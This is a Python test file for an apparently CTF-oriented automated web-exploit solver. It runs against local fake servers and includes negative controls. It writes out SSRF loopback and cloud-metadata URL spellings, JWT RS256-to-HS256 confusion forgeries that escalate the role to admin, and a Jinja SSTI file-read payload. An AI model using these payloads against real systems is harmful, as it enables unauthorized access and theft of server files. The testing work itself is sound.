#!/usr/bin/env python3
"""Local-fake tests for the Day 22 P1 web-solver additions in solvers/web/proof_hunt.py (all GET-only, ON by
default -- safe to auto-run; no network, no live target):

  A. SSRF alternate-IP loopback encodings: internal_host / inner_ok accept 127.1, 0x7f000001, 2130706433 and
     [::1]; a PUBLIC decimal/dotted/rebinding spelling is still rejected; _ssrf_urls appends them (within
     SSRF_MAX) only when the target shows an SSRF surface, and a bare parameter is unchanged.
  B. JWT RS256->HS256 algorithm confusion: jwt_forgeries, given an asymmetric token and a public key, adds an
     HS256 forgery signed with the public-key bytes (web.forge_jwt_hs_confusion); none for an HS256 token or with
     no key. jwk_to_pem round-trips a JWK.
  C. end to end: a target that exposes its RSA public key at /jwks and gates /admin behind a token it verifies
     HS256-with-that-key -> proof_hunt reads the proof under the forged token (the original token is the control).
  D. clue-driven selection: when /api/clues names a feature_route whose reflecting parameter no page links, the
     SSTI shape still fires on that route (via _shape_params) and reads the proof.
"""
import base64
import hashlib
import hmac
import importlib.util
import json
import re
import sys
import urllib.parse
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "tests"))
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))
import event_pin  # noqa: E402  (tests/event_pin.py)
event_pin.pin(globals(), "huntress")  # Huntress web tests: proof_<32 hex> payoffs (events/huntress [proof])
# tests/test_day21_web_solver.py was archived with tools/web_open.py (B-240 deferred): its Site/serve/hunt
# fakes and the PH loader were carried verbatim into tests/web_fakes.py (see that file's header and B-007),
# so load T from there. HSite/hserve still come from tests/test_day21r4_383.py, which is in the tree.
import web_fakes as T  # noqa: E402
_r4 = importlib.util.spec_from_file_location("t21r4", REPO / "tests" / "test_day21r4_383.py")
R4 = importlib.util.module_from_spec(_r4)
_r4.loader.exec_module(R4)
PH = T.PH
page, js, uuid_proof, Site, hunt = T.page, T.js, T.uuid_proof, T.Site, T.hunt
HSite, hserve = R4.HSite, R4.hserve
import web as _web  # noqa: E402

FAILED, COUNT = [], [0]


def check(label, ok, detail=""):
    COUNT[0] += 1
    print(("ok   " if ok else "FAIL ") + label + ("" if ok else f"  <- {detail!r}"))
    if not ok:
        FAILED.append(label)


def b64u(obj):
    return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()


# ---------------------------------------------------------------------------------------------------------
#  A. SSRF alternate-IP loopback encodings
# ---------------------------------------------------------------------------------------------------------
def test_ssrf_alt_ip():
    ok = ["http://127.1/", "http://0x7f000001/", "http://2130706433/", "http://[::1]/", "http://10.1/",
          "http://0x0a000001/", "http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/"]
    bad = ["http://134744072/",            # decimal 8.8.8.8 (public)
           "http://0x08080808/",           # hex 8.8.8.8 (public)
           "http://127.0.0.1.nip.io/",     # DNS rebinding host
           "http://8.8.8.8/", "http://172.32.0.1/"]
    check("A internal_host/inner_ok accept the alt loopback spellings (127.1, 0x7f000001, decimal, [::1])",
          all(PH.inner_ok(u) for u in ok), [u for u in ok if not PH.inner_ok(u)])
    check("A a PUBLIC decimal/hex spelling and a rebinding host are still rejected",
          not any(PH.inner_ok(u) for u in bad), [u for u in bad if PH.inner_ok(u)])
    check("A _legacy_internal_ip maps the spellings to the right IPv4",
          str(PH._legacy_internal_ip("2130706433")) == "127.0.0.1"
          and str(PH._legacy_internal_ip("0x7f000001")) == "127.0.0.1"
          and str(PH._legacy_internal_ip("127.1")) == "127.0.0.1"
          and str(PH._legacy_internal_ip("10.1")) == "10.0.0.1"
          and PH._legacy_internal_ip("nope") is None,
          (PH._legacy_internal_ip("2130706433"), PH._legacy_internal_ip("127.1")))
    # a decimal 192.168.0.1 is RFC1918, so internal (a correct accept, not a bypass of the public guard)
    check("A a decimal RFC1918 address is internal (192.168.0.1 = 3232235521)",
          PH.inner_ok("http://3232235521/") and str(PH._legacy_internal_ip("3232235521")) == "192.168.0.1")

    h = PH._Hunter("http://scope.local", deadline=None, files=(), prompt="")
    bare = h._ssrf_urls([], "")
    surf = h._ssrf_urls([], "http://backend/")
    check("A a bare SSRF parameter sends NO alt loopback spelling (prior behaviour, request count unchanged)",
          not any(u in bare for u in PH.SSRF_ALT), [u for u in PH.SSRF_ALT if u in bare])
    check("A with an SSRF surface (an offered internal URL) the alt spellings are appended, within SSRF_MAX",
          all(u in surf for u in PH.SSRF_ALT) and len(surf) <= PH.SSRF_MAX, (len(surf), surf))


# ---------------------------------------------------------------------------------------------------------
#  B. JWT RS256 -> HS256 algorithm confusion (unit)
# ---------------------------------------------------------------------------------------------------------
def _rsa_keypair():
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = key.public_key()
    pem = pub.public_bytes(serialization.Encoding.PEM,
                           serialization.PublicFormat.SubjectPublicKeyInfo).decode()
    nums = pub.public_numbers()

    def i2b64(n):
        raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
    jwk = {"kty": "RSA", "n": i2b64(nums.n), "e": i2b64(nums.e)}
    return pem, jwk


def _hs_valid(token, key_bytes):
    hdr, pl, sig = token.split(".")
    want = base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))
    calc = hmac.new(key_bytes, f"{hdr}.{pl}".encode(), hashlib.sha256).digest()
    return hmac.compare_digest(calc, want)


def test_jwt_hs_confusion_unit():
    pem, jwk = _rsa_keypair()
    pem2, _jwk2 = _rsa_keypair()
    rs = b64u({"alg": "RS256", "typ": "JWT"}) + "." + b64u({"sub": "guest", "role": "user"}) + ".c2ln"
    dec = _web.decode_jwt(rs)
    forged = PH.jwt_forgeries(rs, dec, [pem])
    hsconf = [(t, v) for t, v in forged if t.startswith("hsconf")]
    check("B jwt_forgeries adds an hsconf forgery for an RS256 token when a public key is given", bool(hsconf),
          [t for t, _ in forged])
    shaped, valid = [], []
    for _tag, tok in hsconf:
        h = json.loads(base64.urlsafe_b64decode(tok.split(".")[0] + "=="))
        p = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))
        shaped.append(h.get("alg") == "HS256" and str(p.get("role")) == "admin")
        valid.append(h.get("alg") == "HS256" and _hs_valid(tok, pem.encode()))
    check("B every hsconf token is HS256 with role raised to admin", all(shaped), shaped)
    check("B at least one hsconf token is signed with the exact public-key bytes (multiple key forms tried)",
          any(valid), valid)
    check("B no hsconf forgery without a public key", not any(t.startswith("hsconf")
          for t, _ in PH.jwt_forgeries(rs, dec, [])))
    check("B ambiguous public keys disable the exact hsconf replay",
          not any(t.startswith("hsconf")
                  for t, _ in PH.jwt_forgeries(rs, dec, [pem, pem2])))
    hs = b64u({"alg": "HS256", "typ": "JWT"}) + "." + b64u({"role": "user"}) + ".c2ln"
    check("B no hsconf forgery for a symmetric (HS256) token even with a key",
          not any(t.startswith("hsconf") for t, _ in PH.jwt_forgeries(hs, _web.decode_jwt(hs), [pem])))
    check("B jwk_to_pem round-trips a JWK to the same public key PEM", PH.jwk_to_pem(jwk) == pem,
          (PH.jwk_to_pem(jwk) or "")[:40])
    for field in ("jku", "x5u"):
        hosted = (b64u({"alg": "RS256", "typ": "JWT", field: "https://keys.invalid/jwks.json"})
                  + "." + b64u({"role": "user"}) + ".c2ln")
        check(f"B hosted {field} remains gated: no automatic forgery or replay",
              PH.jwt_forgeries(hosted, _web.decode_jwt(hosted), [pem]) == [])


# ---------------------------------------------------------------------------------------------------------
#  C. JWT confusion, end to end (a /jwks PEM + an HS256-with-pubkey-gated admin route)
# ---------------------------------------------------------------------------------------------------------
def test_jwt_confusion_end_to_end():
    pem, _jwk = _rsa_keypair()
    proof = uuid_proof("jwtconf")
    rs = b64u({"alg": "RS256", "typ": "JWT"}) + "." + b64u({"sub": "guest", "role": "user"}) + ".c2ln"

    def root(q, h):
        return (200, "text/html; charset=utf-8",
                T.HTML.format(t="Portal", b="<a href='/admin'>admin</a> <a href='/jwks'>jwks</a>"),
                {"Set-Cookie": f"session={rs}; Path=/"})

    def jwks(q, h):
        return 200, "text/plain", pem        # the PEM in the body (web-exposed public key)

    def admin(q, h):
        tok = None
        auth = next((v for k, v in (h or {}).items() if k.lower() == "authorization"), "")
        if auth.lower().startswith("bearer "):
            tok = auth[7:].strip()
        if not tok:
            for part in (next((v for k, v in (h or {}).items() if k.lower() == "cookie"), "")).split(";"):
                k, _, v = part.strip().partition("=")
                if k == "session":
                    tok = v
        try:
            parts = (tok or "").split(".")
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
            if header.get("alg") == "HS256" and _hs_valid(tok, pem.encode()) and str(payload.get("role")) == "admin":
                return page("Admin", f"<pre>{proof}</pre>")
        except Exception:
            pass
        return 403, "text/html", "<p>staff only</p>"

    site = HSite({"/": root, "/jwks": jwks, "/admin": admin})
    srv, url = hserve(site)
    ctx = {"deadline": None, "max_requests": 400, "log_dir": None, "challenge": "t"}
    out = PH.solve_targets([{"answer_id": "proof-1", "url": url, "index": 1, "question": "Recover the proof."}], ctx)
    srv.shutdown()
    srv.server_close()
    check("C end to end: the RS256->HS256-confusion forgery reads the proof from the admin route",
          out.get("proof-1") == proof, out)


def _jwt_hunt(routes):
    site = HSite(routes)
    srv, url = hserve(site)
    try:
        ctx = {"deadline": None, "max_requests": 400, "log_dir": None, "challenge": "jwt-negative"}
        out = PH.solve_targets([
            {"answer_id": "proof-1", "url": url, "index": 1,
             "question": "Recover the proof from the target."}
        ], ctx)
        return out, site.hits
    finally:
        srv.shutdown()
        srv.server_close()


def test_jwt_confusion_negative_controls():
    """The cold path stays one-token/one-key/read-only and baseline-subtracted."""
    pem, _jwk = _rsa_keypair()
    rs = b64u({"alg": "RS256", "typ": "JWT"}) + "." + b64u(
        {"sub": "guest", "role": "user"}) + ".c2ln"

    # Both the original control and an accepted confusion token expose the
    # same proof.  It is therefore target content, not a novel exploit payoff.
    decoy = uuid_proof("jwt-original-decoy")

    def decoy_admin(_q, headers):
        auth = next((v for k, v in headers.items() if k.lower() == "authorization"), "")
        tok = auth[7:].strip() if auth.lower().startswith("bearer ") else ""
        if tok == rs:
            return page("Control", f"<pre>{decoy}</pre>")
        try:
            header = json.loads(base64.urlsafe_b64decode(tok.split(".")[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))
            if (header.get("alg") == "HS256" and _hs_valid(tok, pem.encode())
                    and payload.get("role") == "admin"):
                return page("Admin", f"<pre>{decoy}</pre>")
        except Exception:
            pass
        return 403, "text/html", "<p>staff only</p>"

    routes = {
        "/": (200, "text/html", T.HTML.format(
            t="Portal", b="<a href='/admin'>admin</a> <a href='/jwks'>jwks</a>"),
              {"Set-Cookie": f"session={rs}; Path=/"}),
        "/jwks": (200, "text/plain", pem),
        "/admin": decoy_admin,
    }
    out, hits = _jwt_hunt(routes)
    check("C original-token proof decoy is subtracted from the forged response",
          out == {"proof-1": None}, (out, hits))

    # Two distinct target-issued JWTs leave no evidence-backed choice of
    # identity.  The ordinary crawl may read /admin, but no Authorization
    # replay may reach it.
    rs2 = b64u({"alg": "RS256", "typ": "JWT", "kid": "second"}) + "." + b64u(
        {"sub": "viewer", "role": "user"}) + ".c2ln"
    routes = {
        "/": page("Portal", f"<a href='/admin'>admin</a> <a href='/jwks'>jwks</a>"
                  f"<pre>{rs}</pre><pre>{rs2}</pre>"),
        "/jwks": (200, "text/plain", pem),
        "/admin": (403, "text/html", "<p>staff only</p>"),
    }
    out, hits = _jwt_hunt(routes)
    admin_auth = [headers for _at, _method, raw, headers in hits
                  if urllib.parse.urlsplit(raw).path == "/admin"
                  and any(key.lower() == "authorization" for key in headers)]
    check("C ambiguous target-issued JWTs cause no automatic replay",
          out == {"proof-1": None} and not admin_auth, (out, admin_auth))

    # A denied route whose path says it writes state must never become a JWT
    # payoff endpoint, even though it is linked and returns 403.
    routes = {
        "/": (200, "text/html", T.HTML.format(
            t="Portal", b="<a href='/admin/update'>update</a> <a href='/jwks'>jwks</a>"),
              {"Set-Cookie": f"session={rs}; Path=/"}),
        "/jwks": (200, "text/plain", pem),
        "/admin/update": (403, "text/html", "<p>staff only</p>"),
    }
    out, hits = _jwt_hunt(routes)
    write_auth = [headers for _at, _method, raw, headers in hits
                  if urllib.parse.urlsplit(raw).path == "/admin/update"
                  and any(key.lower() == "authorization" for key in headers)]
    check("C write-like JWT route is crawled only as a control and never receives a replay",
          out == {"proof-1": None} and not write_auth, (out, write_auth))

    # A missing original-token response is not an empty baseline.  Keep the
    # vulnerable forged path live, but close the connection for the original
    # Authorization request: the solver must suppress every forgery rather
    # than treating the forged proof as novel.
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    import socket
    import threading

    dropped_proof = uuid_proof("jwt-original-control-drop")
    dropped_hits = []

    class DropOriginalHandler(BaseHTTPRequestHandler):
        redirect_control = False

        def do_GET(self):
            path = urllib.parse.urlsplit(self.path).path
            headers = {key: value for key, value in self.headers.items()}
            dropped_hits.append((path, headers))
            auth = next((value for key, value in headers.items()
                         if key.lower() == "authorization"), "")
            token = auth[7:].strip() if auth.lower().startswith("bearer ") else ""
            redirect_control = type(self).redirect_control
            drop_path = "/control-drop" if redirect_control else "/admin"
            if path == drop_path and token == rs:
                self.close_connection = True
                try:
                    self.connection.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                self.connection.close()
                return
            if path == "/":
                admin_path = "/admin-redirect" if redirect_control else "/admin"
                body = T.HTML.format(
                    t="Portal", b=f"<a href='{admin_path}'>admin</a> <a href='/jwks'>jwks</a>",
                ).encode()
                status, ctype = 200, "text/html"
                extra = {"Set-Cookie": f"session={rs}; Path=/"}
            elif path == "/jwks":
                body, status, ctype, extra = pem.encode(), 200, "text/plain", {}
            elif path == "/admin-redirect" and token == rs:
                body, status, ctype = b"follow the original control", 302, "text/plain"
                extra = {"Location": "/control-drop"}
            elif path in ("/admin", "/admin-redirect"):
                valid = False
                try:
                    header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "=="))
                    payload = json.loads(base64.urlsafe_b64decode(token.split(".")[1] + "=="))
                    valid = (header.get("alg") == "HS256" and _hs_valid(token, pem.encode())
                             and payload.get("role") == "admin")
                except Exception:
                    pass
                body = ((f"<pre>{dropped_proof}</pre>" if valid else "<p>staff only</p>").encode())
                status, ctype, extra = (200 if valid else 403), "text/html", {}
            else:
                body, status, ctype, extra = b"not found", 404, "text/plain", {}
            self.send_response(status)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            for key, value in extra.items():
                self.send_header(key, value)
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_args):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), DropOriginalHandler)
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{server.server_address[1]}/"
    try:
        out = PH.solve_targets([
            {"answer_id": "proof-1", "url": url, "index": 1,
             "question": "Recover the proof from the target."}
        ], {"deadline": None, "max_requests": 400, "log_dir": None,
            "challenge": "jwt-control-drop"})
    finally:
        server.shutdown()
        server.server_close()
    forged_auth = [auth for path, headers in dropped_hits if path == "/admin"
                   for auth in [next((value for key, value in headers.items()
                                      if key.lower() == "authorization"), "")]
                   if auth and auth != "Bearer " + rs]
    check("C a failed original-token control suppresses every forged Authorization replay",
          out == {"proof-1": None} and not forged_auth, (out, forged_auth, dropped_hits))

    # The redirect envelope is not the end of the baseline: fetch() follows a
    # tagged same-origin Location and may return the earlier 302 when that
    # downstream transport fails. The barrier must inspect the whole tagged
    # chain before it allows the forged request to the original endpoint.
    dropped_hits.clear()
    DropOriginalHandler.redirect_control = True
    server = ThreadingHTTPServer(("127.0.0.1", 0), DropOriginalHandler)
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{server.server_address[1]}/"
    try:
        redirected = PH.solve_targets([
            {"answer_id": "proof-1", "url": url, "index": 1,
             "question": "Recover the proof from the target."}
        ], {"deadline": None, "max_requests": 400, "log_dir": None,
            "challenge": "jwt-control-redirect-drop"})
    finally:
        server.shutdown()
        server.server_close()
    redirected_forged_auth = [auth for path, headers in dropped_hits if path == "/admin-redirect"
                              for auth in [next((value for key, value in headers.items()
                                                if key.lower() == "authorization"), "")]
                              if auth and auth != "Bearer " + rs]
    check("C a failed downstream original-token redirect suppresses every forged replay",
          redirected == {"proof-1": None} and not redirected_forged_auth,
          (redirected, redirected_forged_auth, dropped_hits))


# ---------------------------------------------------------------------------------------------------------
#  D. clue-driven selection: SSTI on a clue-named feature route whose parameter no page links
# ---------------------------------------------------------------------------------------------------------
def test_clue_driven_ssti():
    proof = uuid_proof("clue-ssti")
    files = {"/run/huntress/objective.txt": proof + "\n"}

    def greet(q):
        v = q.get("name", "guest")

        def sub(m):
            e = m.group(1).strip()
            mm = re.fullmatch(r"(\d+)\s*\*\s*(\d+)", e)
            if mm:
                return str(int(mm.group(1)) * int(mm.group(2)))
            mm = re.fullmatch(r"lipsum\.__globals__\['__builtins__'\]\['open'\]\('([^']+)'\)\.read\(\)", e)
            if mm:
                return files.get(mm.group(1), "")
            return ""
        return page("Greeter", f"<p>Hello {re.sub(r'{{(.*?)}}', sub, v)}!</p>")

    # NB: the landing page links NOTHING; the reflecting route is known only from /api/clues (feature_route)
    routes = {"/": page("Quiet", "<p>Nothing to see here.</p>"),
              "/api/clues": js({"feature_route": "/greet-ab12"}),
              "/greet-ab12": greet}
    out, secs, _ = hunt([Site(routes)], files_prompt="The objective is mounted at /run/huntress/objective.txt.")
    check(f"D clue-driven SSTI on a feature_route whose parameter no page links: the proof ({secs:.2f} s)",
          out == {"proof-1": proof}, out)


def main():
    for fn in (test_ssrf_alt_ip, test_jwt_hs_confusion_unit, test_jwt_confusion_end_to_end,
               test_jwt_confusion_negative_controls, test_clue_driven_ssti):
        try:
            fn()
        except Exception as e:
            import traceback
            traceback.print_exc()
            FAILED.append(f"{fn.__name__} raised: {e}")
    print()
    if FAILED:
        print(f"FAILED: {len(FAILED)} of {COUNT[0]} check(s)")
        sys.exit(1)
    print(f"PASS: {COUNT[0]} check(s)")


if __name__ == "__main__":
    main()
